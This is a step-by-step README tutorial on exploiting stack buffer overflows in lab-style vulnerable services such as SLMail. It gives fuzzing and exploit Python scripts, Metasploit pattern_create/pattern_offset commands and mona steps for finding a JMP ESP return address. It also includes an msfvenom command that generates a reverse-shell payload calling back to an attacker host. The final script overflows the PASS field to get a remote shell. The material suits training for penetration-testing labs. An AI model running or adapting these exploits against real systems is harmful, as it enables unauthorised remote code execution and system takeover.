# Buffer-Overflow-In-5-Simple-Steps

Steps:
1) Fuzzing
2) Finding Offset
3) Finding Bad characters
4) Finding RET Address
5) Generating Shellcode and getting shell



Now in every application you are testing for buffer overflow there may be a parameter or maybe not so you can manually send your every payload using nc or use a python script to fast up everything


Basic python script to exploit basic buffer overflow in applications like slmail, warftp, vulnserver etc.


#!/usr/bin/python
import time, struct, sys
import socket as so
buff = "A" * 5000
ipadd = str("192.168.2.41")
port = int("110")
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try: 
 s.connect((ipadd,port))
 s.recv(1024)
 s.send('TRUN vanshal' +'\r\n')
 print "\n[+] Completed."
except:
 print("Failed")
sys.exit()

NOTE: If you copy this script make sure to correct " medium messup single quote sometimes


1) Fuzzing


Try to send 5000 A's in python script and increase 1000 everytime if service is not stopped.


2) Finding Offset


Generate random characters using
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb


Command: 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000


here 5000 is where the service is crashing  


Now send the generated pattern from python script


Now in immunity debugger copy the EIP address and send that address in 


/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb


/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP Address


3) Finding Bad Characters


Send all hex values from python script 
hex-values -  https://raw.githubusercontent.com/Vanshal/Buffer-Overflow-In-5-Simple-Steps/master/all-hex-values




Now in immunity debugger right-click on ESP and select Follow in Dump to show the input buffer hex characters in memory
Now look at the badchars list and the immunity and compare where it changes something and remove that from python script and re-run the script to confirm that no badchar is left


4) Finding RET Address


Default: 
JMP ESP = FFE4
After installing mona in immunity 
Commnand:
!mona modules
Find the dll of your service and if there is no ddl search for exe
Probably the one with False in all memory protection is the one you need


Now copy the dll file name
the run
!mona find -s "\xff\xe4" -m slmfc.dll (slmfc.dll is dll found with !mona modules)


Copy the address and convert it to little endian format
eg
0x5f4a358f
\x8f\x35\x4a\x5f


5) Generating Shellcode and getting shell


msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.123 LPORT=443 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c


here using -b switch specify badchars found in step 3


Final Script
#!/usr/bin/python
import time, struct, sys
import socket as so
buf = GENERATED SHELLCODE
buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + '\x90' * 16 + buf
s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect(('192.168.0.2',110))
s.recv(1024)
s.send('USER vanshal' +'\r\n')
s.recv(1024)
s.send('PASS ' + buff + '\r\n')
print "\n[+] Completed."
sys.exit()


NOTE: If you think other step is correct and still its not working try to change msfvenom payload type to bind shell OR try to change the value of nops to 30,20,24 etc…
